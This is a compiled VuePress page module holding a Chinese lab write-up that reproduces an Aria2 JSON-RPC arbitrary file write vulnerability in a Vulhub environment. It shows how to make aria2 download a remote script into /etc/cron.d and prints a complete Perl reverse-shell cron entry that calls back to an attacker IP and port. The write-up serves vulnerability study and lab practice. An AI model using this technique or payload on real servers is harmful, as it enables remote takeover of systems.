import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as c,c as l,a as e,b as t,d as o,e as n}from"./app-58e4a7d6.js";const s={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),p=e("p",null,"Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。",-1),h={href:"https://paper.seebug.org/120/",target:"_blank",rel:"noopener noreferrer"},E=n(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>6800是aria2的rpc服务的默认端口，环境启动后，访问<code>http://your-ip:6800/</code>，发现服务已启动并且返回404页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),u={href:"http://binux.github.io/yaaw/demo/",target:"_blank",rel:"noopener noreferrer"},B=e("p",null,[t("打开yaaw，点击配置按钮，填入运行aria2的目标域名："),e("code",null,"http://your-ip:6800/jsonrpc")],-1),_=e("figure",null,[e("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202211925680.png",alt:"",tabindex:"0",loading:"lazy"}),e("figcaption")],-1),b=e("p",null,"然后点击Add，增加一个新的下载任务，将另一台VPS服务器上的反弹shell脚本下载至/etc/cron.d。",-1),x=e("p",null,"在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell：",-1),g=e("figure",null,[e("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202211931602.png",alt:"",tabindex:"0",loading:"lazy"}),e("figcaption")],-1),m={href:"http://xxx.xxx.xxx.xxx/reverse_shell.sh%EF%BC%89%E4%B8%8B%E8%BD%BD%E5%88%B0/etc/cron.d/%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BAshell%E3%80%82%E8%80%8C%E5%9C%A8debian%E4%B8%AD%EF%BC%8C/etc/cron.d%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E5%B0%86%E8%A2%AB%E4%BD%9C%E4%B8%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%88%E7%B1%BB%E4%BC%BCcrontab%EF%BC%89%E8%AF%BB%E5%8F%96%EF%BC%8C%E7%AD%89%E5%BE%85%E4%B8%80%E5%88%86%E9%92%9F%E4%B8%8D%E5%88%B0%E5%8D%B3%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell%EF%BC%9A",target:"_blank",rel:"noopener noreferrer"},f=n(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>* * * * * root /usr/bin/perl -e &#39;use Socket;$i=&quot;192.168.174.128&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用crontab -l命令查看定时任务，并不能查看到我们设置的反弹shell。</p><p>cron执行时要读取三个地方的配置文件：一是/etc/crontab，二是/etc/cron.d目录下的所有文件，三是每个用户的配置文件。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202212002737.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><blockquote><p>如果反弹不成功，注意crontab文件的格式，以及换行符必须是<code>\\n</code>，且文件结尾需要有一个换行符（建议直接在VPS服务器上执行vim）。</p></blockquote><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202212001183.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6),k={href:"https://paper.seebug.org/120/",target:"_blank",rel:"noopener noreferrer"};function A(C,v){const a=i("ExternalLinkIcon");return c(),l("div",null,[d,p,e("p",null,[t("参考阅读："),e("a",h,[t("https://paper.seebug.org/120/"),o(a)])]),E,e("p",null,[t("因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 "),e("a",u,[t("http://binux.github.io/yaaw/demo/"),o(a)]),t(" 。")]),B,_,b,x,g,e("p",null,[t("这时候，arai2会将恶意文件（我指定的另一台VPS服务器上的URL，为"),e("a",m,[t("http://xxx.xxx.xxx.xxx/reverse_shell.sh）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell："),o(a)])]),f,e("p",null,[t("当然，我们也可以尝试写入其他文件，更多利用方法可以参考"),e("a",k,[t("这篇文章"),o(a)]),t("。")])])}const F=r(s,[["render",A],["__file","Aria2 任意文件写入漏洞.html.vue"]]);export{F as default};
